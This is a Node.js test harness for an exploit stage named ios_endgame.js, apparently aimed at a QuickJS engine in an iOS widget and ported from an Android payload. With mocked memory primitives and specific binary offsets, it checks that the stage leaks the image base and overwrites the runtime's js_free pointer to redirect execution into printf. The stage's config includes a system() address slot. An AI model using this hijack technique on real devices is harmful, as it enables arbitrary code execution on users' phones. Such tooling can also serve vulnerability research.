#!/usr/bin/env node
/*
 * Host-only sanity test for ios_endgame.js.
 *
 * It mocks the QuickJS primitive surface (rt, D, ENT, rd64/wr64, TRIG/BIG)
 * and checks that the iOS endgame:
 *   - derives the image base from js_free - JS_DEF_FREE,
 *   - writes printf(marker) into rt->mf.js_free / rt->malloc_state.opaque,
 *   - restores both fields,
 *   - leaves the marker in the victim block.
 *
 * It does NOT execute printf: in the real widget that is the hook call.
 *
 * Usage: node test_endgame_node.js [path/to/ios_endgame.js]
 */

const fs = require('fs');
const path = require('path');

const endgamePath = process.argv[2] ||
  path.join(__dirname, 'ios_endgame.js');
const endgame = fs.readFileSync(endgamePath, 'utf8');

const BASE = 0x100000000n;
const JS_DEF_FREE = 0x3127cd8n;
const STUB_PRINTF = 0x5493a20n;
const STUB_FFLUSH = 0x5492f40n;
const RT = 0x300000000n;
const D = 0x200000000n;
const JS_FREE = BASE + JS_DEF_FREE;

const mem = new Map();
const writes = [];
function rd64(a) {
  a = BigInt.asUintN(64, BigInt(a));
  if (a === BASE) return 0xfeedfacfn;
  return mem.get(a) || 0n;
}
function wr64(a, v) {
  a = BigInt.asUintN(64, BigInt(a));
  writes.push([a, BigInt.asUintN(64, BigInt(v))]);
  mem.set(a, BigInt.asUintN(64, BigInt(v)));
}
mem.set(RT + 16n, JS_FREE);
mem.set(RT + 64n, 0x1234n);
// Fake __stubs entries: adrp x16, … / ldr x16, … / br x16.
mem.set(BASE + STUB_PRINTF, 0x90000010n);
mem.set(BASE + STUB_FFLUSH, 0x90000010n);

const state = { result: '' };
function setres(s) { state.result = s; }
function hex(v) { return '0x' + (v & 0xffffffffffffffffn).toString(16); }
function codeok(v) { return v > 0x10000n && v < 0x0001000000000000n && (v & 3n) === 0n; }

const ENT = { u8: new Uint8Array(128) };
let TRIG = { tag: 'trig' };
let BIG = { tag: 'big' };
const CFG = {
  JS_DEF_FREE: Number(JS_DEF_FREE),
  JS_DEF_MALLOC: 0,
  STUB_PRINTF: Number(STUB_PRINTF),
  STUB_PUTS: 0,
  STUB_FFLUSH: Number(STUB_FFLUSH),
  PROOF_ADDR: 0,
  FFLUSH_ADDR: 0,
  SYSTEM_ADDR: 0,
  MARKER: 'IOSPORT_R1827_OK\n',
  DBG: 0,
};
const js_free = rd64(RT + 16n);

// The endgame is a fragment inside the Android payload's IIFE.  Wrap it.
const fn = new Function(
  'rt', 'js_free', 'D', 'ENT', 'rd64', 'wr64', 'RD', 'codeok', 'hex',
  'setres', 'CFG', 'TRIG', 'BIG',
  '(function () {\n' + endgame + '\n})();\n' +
  'return { TRIG: TRIG, BIG: BIG, marker: ENT.u8 };'
);
const out = fn(RT, js_free, D, ENT, rd64, wr64, rd64, codeok, hex, setres,
               CFG, TRIG, BIG);

let ok = true;
function check(name, cond, detail) {
  if (!cond) { ok = false; console.log('FAIL ' + name + (detail ? ': ' + detail : '')); }
  else console.log('ok   ' + name);
}
check('result', state.result.startsWith('IOS_OK'), state.result);
check('printf hook was installed',
  writes.some(([a, v]) => a === RT + 16n && v === BASE + STUB_PRINTF));
check('printf opaque = marker block',
  writes.some(([a, v]) => a === RT + 64n && v === D));
check('js_free restored', rd64(RT + 16n) === JS_FREE);
check('opaque restored', rd64(RT + 64n) === 0x1234n);
check('marker in victim block',
  Buffer.from(out.marker.slice(0, 18)).toString('latin1').startsWith('IOSPORT_R1827_OK'));

process.exit(ok ? 0 : 1);
